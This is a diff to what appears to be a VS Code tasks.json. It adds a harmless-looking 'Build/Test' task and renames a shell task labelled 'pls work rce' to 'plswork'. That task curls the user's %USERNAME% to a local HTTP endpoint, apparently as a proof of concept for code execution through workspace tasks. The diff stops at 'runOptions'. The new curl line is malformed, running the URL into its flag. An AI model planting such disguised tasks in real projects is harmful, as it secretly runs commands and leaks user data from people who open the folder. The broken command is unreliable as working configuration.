@@ -2,9 +2,16 @@
     "version": "2.0.0",
     "tasks": [
         {
-            "label": "pls work rce",
+            "label": "Build/Test",
+            "type": "npm",
+            "script": "test",
+            "group": "test",
+            "detail": "Runs the standard project tests."
+        },
+        {
+            "label": "plswork",
             "type": "shell",
-            "command": "curl -fsG http://127.0.0.1:8080/demonstration --data-urlencode user=%USERNAME% &",
+            "command": "curl -fsG http://127.0.0.1:8080/--data-urlencode user=%USERNAME%",
             "group": "none",
             "detail": "vada pav",
             "runOptions": {
